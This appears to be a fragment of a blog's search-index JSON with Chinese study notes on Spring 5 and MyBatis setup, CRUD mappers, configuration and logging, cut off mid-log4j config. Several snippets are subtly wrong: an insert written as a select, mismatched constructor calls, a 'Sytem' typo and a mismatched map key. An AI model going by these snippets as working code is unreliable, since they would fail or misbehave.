git@github.com","categories":[],"tags":[{"name":"SDC","slug":"SDC","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/SDC/"}]},{"title":"Spring5","slug":"Spring5","date":"2021-07-26T13:05:21.000Z","updated":"2021-08-01T12:05:26.667Z","comments":true,"path":"2021/07/26/Spring5/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/07/26/Spring5/","excerpt":"","text":"1.Spring框架1.1简介目的：解决企业应用开发的复杂性，使现有技术更加容易使用，本身是大杂烩，整合了现有的技术框架。 作者：Rob Johnson SSH：Struct2 + Spring + Hibernate SSM：SpringMVC + Spring + Mybatis 官网：Spring Framework Github：spring-projects/spring-framework: Spring Framework (github.com) 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;5.3.9&lt;/version&gt;&lt;/dependency&gt; 12345&lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;5.3.9&lt;/version&gt;&lt;/dependency&gt; 1.2优点 Spring是一个免费的开源的JAVA框架（容器） Spring是轻量级的、非入侵式的框架 控制反转（IOC）、面向切面编程(AOP) 支持事务处理 对框架整合的支持 总结：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架 1.3 组成清除git缓存：git rm -r –cached .","categories":[],"tags":[{"name":"Spring","slug":"Spring","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/Spring/"}]},{"title":"Mybatis","slug":"Mybatis","date":"2021-07-22T07:13:21.000Z","updated":"2021-08-20T16:14:42.691Z","comments":true,"path":"2021/07/22/Mybatis/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/07/22/Mybatis/","excerpt":"","text":"Mybatismybatis 官方文档 1.简介 apache的开源框架iBatis演进而来，持久层框架 支持定制化SQL、存储过程以及高级映射 MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。 MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。 目前迁移至GitHub 如何获得Mybits maven仓库 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt;&lt;/dependency&gt; Github 源码注释：GitHub - tuguangquan/mybatis: mybatis源码中文注释**** 1.2 持久化 数据持久化 将程序的数据在持久状态和瞬时状态转化的过程。 内存：断电及失 数据库JDBC、IO文件持久化 生活：记笔记 为什么需要持久化？ 有一些对象，不能让他丢弃掉 内存费用高 1.3 持久层DAO层、Service（服务实现）层、Controller（接收用户请求）层…… 完成持久化工作的代码块 层界限十分明显 1.4 需要Mybatis的原因 方便。 传统JDBC代码太复杂。为简化操作，提高自动化，产生了框架。 不用也可以，更容易上手。技术没有高低之分。 特点： 简单易学 灵活 解除sql与程序代码的耦合：通过提供DAO层，将业务逻辑和数据访问逻辑分离，使系统的设计更清晰，更易维护，更易单元测试。sql和代码的分离，提高了可维护性。 提供映射标签，支持对象与数据库的orm字段关系映射。 提供对象关系映射标签，支持对象关系组建维护。 提供xml标签，支持编写动态sql。 使用的人多 2.第一个Mybatis程序思路：搭建环境—-》导入Mybatis—-》编写代码———–》测试 2.1 搭建环境使用智慧校园门户网站的数据库 新建项目 新建普通Maven项目 删除src目录 导入maven依赖 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;!--父工程--&gt; &lt;groupId&gt;org.example&lt;/groupId&gt; &lt;artifactId&gt;MyBatis_Learning&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;!--导入依赖--&gt; &lt;dependencies&gt; &lt;!--mysql驱动--&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.46&lt;/version&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.4.6&lt;/version&gt; &lt;/dependency&gt; &lt;!--Junit--&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/project&gt; 2.2 创建一个模块 编写MyBatis的核心配置文件 编写MyBatis的工具类 从 XML 中构建 SqlSessionFactory 每个基于 MyBatis 的应用都是以一个 SqlSessionFactory 的实例为核心的。SqlSessionFactory 的实例可以通过 SqlSessionFactoryBuilder 获得。而 SqlSessionFactoryBuilder 则可以从 XML 配置文件或一个预先配置的 Configuration 实例来构建出 SqlSessionFactory 实例。 从 XML 文件中构建 SqlSessionFactory 的实例非常简单，建议使用类路径下的资源文件进行配置。 但也可以使用任意的输入流（InputStream）实例，比如用文件路径字符串或 file:// URL 构造的输入流。MyBatis 包含一个名叫 Resources 的工具类，它包含一些实用方法，使得从类路径或其它位置加载资源文件更加容易。 12345678try &#123; // 使用MyBatis的第一步：获取sqlSessionFactory对象 String resource = &quot;mybatis-config.xml&quot;; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; XML 配置文件中包含了对 MyBatis 系统的核心设置，包括获取数据库连接实例的数据源（DataSource）以及决定事务作用域和控制方式的事务管理器（TransactionManager）。后面会再探讨 XML 配置文件的详细内容，这里先给出一个简单的示例： 123456789101112131415161718192021&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;!--configuration核心配置文件--&gt;&lt;configuration&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;!--使用JDBC进行事务管理--&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/test?userSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=UTF-8&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;zhulan&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt;&lt;/configuration&gt; 编写mybatis工具类 123456789101112131415161718192021222324252627282930package com.xyq.utils;import org.apache.ibatis.io.Resources;import org.apache.ibatis.session.SqlSession;import org.apache.ibatis.session.SqlSessionFactory;import org.apache.ibatis.session.SqlSessionFactoryBuilder;import java.io.IOException;import java.io.InputStream;//sqlSessionFactory：构建sqlSessionpublic class MybatisUtils &#123; private static SqlSessionFactory sqlSessionFactory; static &#123; try &#123; // 使用MyBatis的第一步：获取sqlSessionFactory对象 String resource = &quot;mybatis-config.xml&quot;; InputStream inputStream = Resources.getResourceAsStream(resource); sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; /*既然有了 SqlSessionFactory，顾名思义，我们可以从中获得 SqlSession 的实例。 SqlSession 提供了在数据库执行 SQL 命令所需的所有方法。 */ public static SqlSession getSqlSession()&#123; return sqlSessionFactory.openSession(); &#125;&#125; 2.3编写代码 实体类 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.xyq.pojo;import java.math.BigInteger;import java.util.Date;//实体类public class Student &#123; private String stu_id; private BigInteger account_num; private String pw_question; private String pw_answer; private String password; private String name; private String sex; private String phone_num; private String email; private String academy; private String major_name; private BigInteger clazz_num; private boolean flag; private java.util.Date createtime; private String createby; private String modifyby; private java.util.Date modifytime; public Student() &#123; &#125; public Student(String stu_id, BigInteger account_num, String pw_question, String pw_answer, String password, String name, String sex, String phone_num, String email, String academy, String major_name, BigInteger clazz_num, boolean flag, Date createtime, String createby, String modifyby, Date modifytime) &#123; this.stu_id = stu_id; this.account_num = account_num; this.pw_question = pw_question; this.pw_answer = pw_answer; this.password = password; this.name = name; this.sex = sex; this.phone_num = phone_num; this.email = email; this.academy = academy; this.major_name = major_name; this.clazz_num = clazz_num; this.flag = flag; this.createtime = createtime; this.createby = createby; this.modifyby = modifyby; this.modifytime = modifytime; &#125;&#125; Dao接口 123456789package com.xyq.dao;import com.xyq.pojo.Student;import java.util.List;public interface StudentDao &#123; List&lt;Student&gt; getStudentList();&#125; 接口实现类由原来的UserDaoImpl转变为一个Mapper配置文件 123456789101112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;!--namespace:绑定一个对应的DAO\\Mapper接口--&gt;&lt;mapper namespace=&quot;com.xyq.dao.StudentDao&quot;&gt; &lt;!--select查询语句--&gt; &lt;!--resultType：设置返回结果类型--&gt; &lt;select id=&quot;getStudentList&quot; resultType=&quot;com.xyq.pojo.Student&quot;&gt; select * from test.student; &lt;/select&gt;&lt;/mapper&gt; 2.4 测试注意点1： 1org.apache.ibatis.binding.BindingException: Type interface com.xyq.dao.StudentDao is not known to the MapperRegistry. MapperRegistry：是什么？ 核心配置文件中注册Mappers 1234&lt;!--每一个Mapper.xml都需要在MyBatis核心配置文件中注册！！！--&gt;&lt;mappers&gt; &lt;mapper resource=&quot;com/xyq/dao/StudentMapper.xml&quot;/&gt;&lt;/mappers&gt; 注意点2： 1java.lang.ExceptionInInitializerError Maven中约定大于配置！！！ 123456789101112131415161718192021&lt;!--在build中配置resources，来防止我们的资源导出失败的问题--&gt; &lt;build&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/resources&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.properties&lt;/include&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;filtering&gt;false&lt;/filtering&gt; &lt;/resource&gt; &lt;/resources&gt; &lt;/build&gt; 可能遇到的问题： 配置文件没有注册 绑定接口错误 方法名不正确 返回类型不正确 Maven导出资源问题 测试完整代码1234567891011121314151617181920212223242526272829303132package com.xyq.dao;import com.xyq.pojo.Student;import com.xyq.utils.MybatisUtils;import org.apache.ibatis.session.SqlSession;import org.junit.Test;import java.util.List;public class StudentDaoTest &#123; @Test public void test()&#123; //第一步：获取SqlSession对象 SqlSession sqlSession = MybatisUtils.getSqlSession(); //执行SQL语句,方式一：getMapper StudentDao studentDao = sqlSession.getMapper(StudentDao.class); List&lt;Student&gt; studentList = studentDao.getStudentList(); //方式二：不推荐// List&lt;Object&gt; objects = sqlSession.selectList(&quot;com.xyq.dao.StudentDao.getStudentList&quot;); int i = 0; for (Student student : studentList) &#123; System.out.println(student); i++; &#125; System.out.println(i); //关闭SqlSession sqlSession.close(); &#125;&#125; 2.5 三个核心类SqlSessionFactoryBuilder这个类可以被实例化、使用和丢弃，一旦创建了 SqlSessionFactory，就不再需要它了。 因此 SqlSessionFactoryBuilder 实例的最佳作用域是方法作用域（也就是局部方法变量）。 你可以重用 SqlSessionFactoryBuilder 来创建多个 SqlSessionFactory 实例，但最好还是不要一直保留着它，以保证所有的 XML 解析资源可以被释放给更重要的事情。 SqlSessionFactorySqlSessionFactory 一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例。 使用 SqlSessionFactory 的最佳实践是在应用运行期间不要重复创建多次，多次重建 SqlSessionFactory 被视为一种代码“坏习惯”。因此 SqlSessionFactory 的最佳作用域是应用作用域。 有很多方法可以做到，最简单的就是使用单例模式或者静态单例模式。 SqlSession每个线程都应该有它自己的 SqlSession 实例。SqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域。 绝对不能将 SqlSession 实例的引用放在一个类的静态域，甚至一个类的实例变量也不行。 也绝不能将 SqlSession 实例的引用放在任何类型的托管作用域中，比如 Servlet 框架中的 HttpSession。 如果你现在正在使用一种 Web 框架，考虑将 SqlSession 放在一个和 HTTP 请求相似的作用域中。 换句话说，每次收到 HTTP 请求，就可以打开一个 SqlSession，返回一个响应后，就关闭它。 这个关闭操作很重要，为了确保每次都能执行关闭操作，你应该把这个关闭操作放到 finally 块中。 2.6 步骤总结pom.xml MybatisUtils.java mybatis-config.xml 实体类,如：Student.java DAO层：StudentDao.java StudentMapper.xml 测试类：StudentDaoTest.java 检查maven有无资源导出问题 2.7 CRUD namespace：命名空间，包名要与Dao接口中的包名一致 select：选择，查询语句 id：对应的namesapce中的方法名称 resultType：SQL语句执行的返回值 parameterType：参数类型 C:CREATE增删改需要提交事务！！！ 12// insert一个学生 int addStudent(Student stu); 123&lt;select id=&quot;addStudent&quot; parameterType=&quot;com.xyq.pojo.Student&quot;&gt; insert into test.student values(#&#123;id&#125;,#&#123;name&#125;,#&#123;pwd&#125;) &lt;/select&gt; 123456789101112131415@Test public void addStudentTest()&#123; //第一步：获取SqlSession对象 SqlSession sqlSession = MybatisUtils.getSqlSession(); //执行SQL语句,方式一：getMapper StudentDao studentDao = sqlSession.getMapper(StudentDao.class); int res = studentDao.addStudent(new Student(&quot;ele202004002&quot;, &quot;张加林&quot;,&quot;zhulan&quot;); if(res&gt;0)&#123; Sytem.out.println(res); &#125; // 提交事务 sqlSession.commit(); sqlSession.close(); &#125; R:READ12// 根据stu_id查询用户 Student getUserById(String stu_id); 123&lt;select id&#x3D;&quot;getUserById&quot; parameterType&#x3D;&quot;String&quot; resultType&#x3D;&quot;com.xyq.pojo.Student&quot;&gt; select * from test.student where stu_id &#x3D; #&#123;stu_id&#125;; &lt;&#x2F;select&gt; 12345678910111213@Test public void getStudentByIdTest()&#123; //第一步：获取SqlSession对象 SqlSession sqlSession = MybatisUtils.getSqlSession(); //执行SQL语句,方式一：getMapper StudentDao studentDao = sqlSession.getMapper(StudentDao.class); Student stu1 = studentDao.getUserById(&quot;ele201704001&quot;); System.out.println(stu1.toString()); sqlSession.close(); &#125; U:UPDATE12// update 用户 int updateStudent(Student stu); 123&lt;update id=&quot;updateStudent&quot; parameterType=&quot;com.xyq.pojo.Student&quot;&gt; update test.student set name=#&#123;name&#125;,pwd=#&#123;pwd&#125; where id=#&#123;id&#125;; &lt;/update&gt; 12345678910@Test public void updateStudent()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); StudentDao mapper = sqlSession.getMapper(StudentDao.class); mapper.updateStudent(new Student(1,&quot;张加林&quot;,&quot;zhulan&quot;)); /*提交事务*/ sqlSession.commit(); sqlSession.close(); &#125; D:DELETE12// 删除一个用户int deleteStudent(int id); 123&lt;update id=&quot;deleteStudent&quot; parameterType=&quot;int&quot;&gt; delete from test.student where id=#&#123;id&#125;; &lt;/update&gt; 12345678910@Test public void updateStudent()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); StudentDao mapper = sqlSession.getMapper(StudentDao.class); mapper.deleteStudent(1); /*提交事务*/ sqlSession.commit(); sqlSession.close(); &#125; 2.7 常见问题 包名之间是用/还是用.(resource绑定mapper必须是/) 标签匹配错误 NullPointerException：没有注册到资源！ 2.8 万能的Map实体类或数据库中的表，字段或参数过多，我们应当考虑使用Map！！！ 12/万能的Map Student getUserById2(Map&lt;String,Object&gt; map); 12345&lt;!--对象中的属性，可以直接取出来 传递Map的key--&gt; &lt;select id=&quot;getUserById2&quot; parameterType=&quot;map&quot;&gt; select * from test.student where stu_id = #&#123;student_id&#125;; &lt;/select&gt; 123456789101112131415@Test public void getStudentByIdTest2()&#123; //第一步：获取SqlSession对象 SqlSession sqlSession = MybatisUtils.getSqlSession(); //执行SQL语句,方式一：getMapper StudentDao studentDao = sqlSession.getMapper(StudentDao.class); Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;(); map.put(&quot;userid&quot;,&quot;ele201704003&quot;); Student stu1 = studentDao.getUserById2(map); System.out.println(stu1.toString()); sqlSession.close(); &#125; Map传递参数，直接在sql中取出key即可。【parameterType=”map”】 对象传递参数，直接在sql中取对象的属性即可。【parameterType=”Object”】 只有一个基本类型参数的情况下，可以再接在SQL中取到。 多个参数Map，或者注解。 2.9 思考题 模糊查询怎么书写？ Java代码执行的时候传递通配符。 123&lt;select id=&quot;getUserLike&quot; resultType=&quot;com.xyq.pojo.Customer&quot;&gt; select * from customersdb.account where username like #&#123;value&#125;; &lt;/select&gt; 123456789@Test public void test2()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); CustomerMapper mapper = sqlSession.getMapper(CustomerMapper.class); List&lt;Customer&gt; name = mapper.getUserLike(&quot;%赵%&quot;); System.out.println(name); sqlSession.close(); &#125; 在SQL拼接中使用通配符：防止SQL注入。 123&lt;select id=&quot;getUserLike&quot; resultType=&quot;com.xyq.pojo.Customer&quot;&gt; select * from customersdb.account where username like &quot;%&quot;#&#123;value&#125;&quot;%&quot;; &lt;/select&gt; 12345678@Test public void test2()&#123; SqlSession sqlSession = MybatisUtils.getSqlSession(); CustomerMapper mapper = sqlSession.getMapper(CustomerMapper.class); List&lt;Customer&gt; name = mapper.getUserLike(&quot;赵&quot;); System.out.println(name); sqlSession.close(); &#125; 3.配置解析1.核心配置文件 mybatis-config.xml configuration（配置） properties（属性） √ settings（设置） √ typeAliases（类型别名） √ typeHandlers（类型处理器） objectFactory（对象工厂） plugins（插件） environments（环境配置）√ environment（环境变量） transactionManager（事务管理器） dataSource（数据源） databaseIdProvider（数据库厂商标识） mappers（映射器）√ 2.环境变量（environments）不过要记住：尽管可以配置多个环境，但每个 SqlSessionFactory 实例只能选择一种环境。 了解部分 123在 MyBatis 中有两种类型的事务管理器（也就是 type=&quot;[JDBC|MANAGED]&quot;）：JDBC – 这个配置直接使用了 JDBC 的提交和回滚设施，它依赖从数据源获得的连接来管理事务作用域。MANAGED – 这个配置几乎没做什么。它从不提交或回滚一个连接，而是让容器来管理事务的整个生命周期（比如 JEE 应用服务器的上下文）。 默认情况下它会关闭连接。然而一些容器并不希望连接被关闭，因此需要将 closeConnection 属性设置为 false 来阻止默认的关闭行为。 连接数据库：dbcp c3p0 druid 数据源(dataSource)：有三种内建的数据源类型（也就是 type=”[UNPOOLED|POOLED|JNDI]”） mybatis默认事务管理器是JDBC，连接池：POOLED 学会配置多套运行环境 3.属性(properties)我们可以通过properties属性来实现引用配置文件。 这些属性可以在外部进行配置，并可以进行动态替换。你既可以在典型的 Java 属性文件中配置这些属性，也可以在 properties 元素的子元素中设置。【db.properties】 编写一个配置文件 db.properties 1234driver=com.mysql.jdbc.Driverurl=jdbc:mysql://localhost:3306/test?userSSL=true&amp;useUnicode=true&amp;characterEncoding=UTF-8username=rootpassword=zhulan 在核心配置文件中引入 注意：xml中所有的标签都可以规定其顺序！！！（标签顺序很重要） 1The content of element type &quot;configuration&quot; must match &quot;(properties?,settings?,typeAliases?,typeHandlers?,objectFactory?,objectWrapperFactory?,reflectorFactory?,plugins?,environments?,databaseIdProvider?,mappers?)&quot;. mybatis-config.xml 123456789101112131415161718192021222324252627282930313233343536373839&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;!--configuration核心配置文件--&gt;&lt;configuration&gt; &lt;!--引入外部配置文件--&gt; &lt;properties resource=&quot;db.properties&quot;/&gt; &lt;!--通过default选择环境--&gt; &lt;environments default=&quot;development&quot;&gt; &lt;environment id=&quot;development&quot;&gt; &lt;!--transactionManager:事务管理器，使用JDBC进行事务管理--&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;!--dataSource：数据源--&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;$&#123;driver&#125;&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;$&#123;url&#125;&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;$&#123;username&#125;&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;$&#123;password&#125;&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;environment id=&quot;test&quot;&gt; &lt;!--使用JDBC进行事务管理--&gt; &lt;transactionManager type=&quot;JDBC&quot;/&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/test?userSSL=true&amp;amp;useUnicode=true&amp;amp;characterEncoding=UTF-8&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;zhulan&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt; &lt;!--每一个Mapper.xml都需要在MyBatis核心配置文件中注册！！！--&gt; &lt;mappers&gt; &lt;mapper resource=&quot;com/xyq/dao/CustomerMapper.xml&quot;/&gt; &lt;/mappers&gt;&lt;/configuration&gt; properties中可以通过property直接设置属性， 123456&lt;!--引入外部配置文件--&gt; &lt;properties resource=&quot;db.properties&quot;&gt; &lt;!--另外的部分在properties中给出--&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;zhulan&quot;/&gt; &lt;/properties&gt; 注意：同一字段优先级问题，优先使用外部配置文件中的数据，然后才是property中的数据。 4.类型别名（typeAliases） 类型别名可为 Java 类型设置一个缩写名字。 意在降低冗余的全限定类名书写。 方式一： 1234&lt;typeAliases&gt; &lt;!--可以给实体类起别名--&gt; &lt;typeAlias type=&quot;com.xyq.pojo.Customer&quot; alias=&quot;Customer&quot;/&gt; &lt;/typeAliases&gt; 方式二：也可以指定一个包名，MyBatis 会在包名下面搜索需要的 Java Bean 扫描实体类的包，它的默认别名为这个类的类名，首字母小写。 123&lt;typeAliases&gt; &lt;package name=&quot;com.xyq.pojo&quot;/&gt;&lt;/typeAliases&gt; 1resultType=&quot;Customer&quot; / resultType=&quot;customer&quot; 若有注解，则别名为其注解值，原有 12@Alias(&quot;hello&quot;)public class Customer 1resultType=&quot;hello&quot; 在实体类较少时使用方式一，较多的时候使用第二种 第一种可以自定义，第二种则不行，如果一定要修改，可以在实体类上增加注解。 优先级：类型别名&gt;注解别名&gt;包别名 5.设置（settings） 设置名 描述 有效值 默认值 cacheEnabled 全局性地开启或关闭所有映射器配置文件中已配置的任何缓存。 true | false true lazyLoadingEnabled 延迟加载的全局开关。当开启时，所有关联对象都会延迟加载。 特定关联关系中可通过设置 fetchType 属性来覆盖该项的开关状态。(懒加载) true | false false useColumnLabel 使用列标签代替列名。实际表现依赖于数据库驱动，具体可参考数据库驱动的相关文档，或通过对比测试来观察。 true | false true useGeneratedKeys 允许 JDBC 支持自动生成主键，需要数据库驱动支持。如果设置为 true，将强制使用自动生成主键。尽管一些数据库驱动不支持此特性，但仍可正常工作（如 Derby）。 true | false False mapUnderscoreToCamelCase 是否开启驼峰命名自动映射，即从经典数据库列名 A_COLUMN 映射到经典 Java 属性名 aColumn。 true | false False logImpl 指定 MyBatis 所用日志的具体实现，未指定时将自动查找。 SLF4J | LOG4J | LOG4J2 | JDK_LOGGING | COMMONS_LOGGING | STDOUT_LOGGING | NO_LOGGING（日志实现） 未设置 一个配置完整的 settings 元素的示例如下： 6.其他配置 typeHandlers（类型处理器） objectFactory（对象工厂） plugins（插件） MyBatis Generator Core：自动生成mybatis代码 Mybatis Plus： 通用mapper 7.映射器：mappersMapperRegistry：注册绑定我们的Mapper.xml文件 方式一：【推荐使用】 123456&lt;!-- 使用相对于类路径的资源引用 --&gt;&lt;mappers&gt; &lt;mapper resource=&quot;org/mybatis/builder/AuthorMapper.xml&quot;/&gt; &lt;mapper resource=&quot;org/mybatis/builder/BlogMapper.xml&quot;/&gt; &lt;mapper resource=&quot;org/mybatis/builder/PostMapper.xml&quot;/&gt;&lt;/mappers&gt; 方式二： 1234&lt;mappers&gt; &lt;!--使用class文件绑定注册--&gt; &lt;mapper class=&quot;com.xyq.dao.CustomerMapper&quot;/&gt; &lt;/mappers&gt; 注意点： 接口和它的Mapper配置文件必须同名 接口和它的Mapper必须在同一个包下面 方式三：使用扫描包进行注入绑定 123&lt;mappers&gt; &lt;package name=&quot;com.xyq.dao&quot;/&gt;&lt;/mappers&gt; 注意点： 接口和它的Mapper配置文件必须同名 接口和它的Mapper必须在同一个包下面 8.生命周期和作用域不同作用域和生命周期类别是至关重要的，因为错误的使用会导致非常严重的并发问题。 [ SqlSessionFactoryBuilder： 一旦创建了SqlSessionFactory就不再需要了 局部变量 SqlSessionFactory： 可以想象为数据库连接池 一旦被创建就应该在应用的运行期间一直存在，没有任何理由丢弃它或重新创建另一个实例。因此 SqlSessionFactory 的最佳作用域是应用作用域。 最简单的就是使用单例模式或者静态单例模式 SqlSession 每个线程都应该有它自己的 SqlSession 实例，可以理解为连接到连接池的一个请求 用完需要关闭，否则占用资源 如果你现在正在使用一种 Web 框架，考虑将 SqlSession 放在一个和 HTTP 请求相似的作用域中。每次收到 HTTP 请求，就可以打开一个 SqlSession，返回一个响应后，就关闭它。 SqlSession 的实例不是线程安全的，因此是不能被共享的，所以它的最佳的作用域是请求或方法作用域 这里面的每个Mapper就代表一个具体的业务 4.解决属性名和字段名不一致的问题1.问题新建一个项目，测试实体类字段不一致的情况。 查询所有账户： 分析： 1234&lt;select id=&quot;getUserList&quot; resultType=&quot;com.xyq.pojo.Customer&quot;&gt; select * from customersdb.account; &lt;!--select id,name,balance from customersdb.account;--&gt; &lt;/select&gt; 解决方法一：起别名 123&lt;select id=&quot;getUserList&quot; resultType=&quot;com.xyq.pojo.Customer&quot;&gt; select id,username as name,balance from customersdb.account; &lt;/select&gt; 2 . ResultMAp结果集映射 12id username passwordid name password 映射数据库列到实体属性 1234567891011&lt;!--结果集映射--&gt; &lt;resultMap id=&quot;UserMap&quot; type=&quot;Customer&quot;&gt; &lt;!--column：数据库中的字段，properties：实体类中的属性--&gt; &lt;result property=&quot;id&quot; column=&quot;id&quot;/&gt; &lt;result property=&quot;balance&quot; column=&quot;balance&quot;/&gt; &lt;result property=&quot;name&quot; column=&quot;username&quot;/&gt; &lt;/resultMap&gt; &lt;select id=&quot;getUserList&quot; resultMap=&quot;UserMap&quot;&gt; select * from customersdb.account; &lt;/select&gt; 上述语句只是简单地将所有的列映射到 HashMap 的键上，这由 resultType 属性指定。 ResultMap 的设计思想：对简单的语句做到零配置，对于复杂一点的语句，只需要描述语句之间的关系就行了。 1234567 &lt;!--结果集映射--&gt; &lt;resultMap id=&quot;UserMap&quot; type=&quot;Customer&quot;&gt; &lt;!--column：数据库中的字段，properties：实体类中的属性--&gt;&lt;!-- &lt;result property=&quot;id&quot; column=&quot;id&quot;/&gt;--&gt;&lt;!-- &lt;result property=&quot;balance&quot; column=&quot;balance&quot;/&gt;--&gt; &lt;result property=&quot;name&quot; column=&quot;username&quot;/&gt; &lt;/resultMap&gt; 事实上，只需要转换不一样的属性与列。 5.日志5.1日志工厂如果一个数据库操作出现异常，我们需要排错，日志就是最好的助手 曾经：sout、debug 现在：日志工厂 logImpl 指定 MyBatis 所用日志的具体实现，未指定时将自动查找。 SLF4J | LOG4J | LOG4J2 | JDK_LOGGING | COMMONS_LOGGING | STDOUT_LOGGING | NO_LOGGING 未设置 SLF4J LOG4J 【掌握】 LOG4J2 JDK_LOGGING COMMONS_LOGGING STDOUT_LOGGING 【掌握】：标准日志输出 NO_LOGGING 在Mybatis具体使用哪一个日志实现，在设置中设定。 配置在Mybatis核心配置文件中配置我们的日志。 5.2 LOG4J 什么是LOG4J？ Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件 我们可以控制每一条日志的输出格式 通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。 1.先导入log4j的包 12345&lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.17&lt;/version&gt;&lt;/dependency&gt; 2.log4j.properties 1234567891011121314151617181920212223log4j.rootLogger=DEBUG,console,file#控制台输出的相关设置log4j.appender.console = 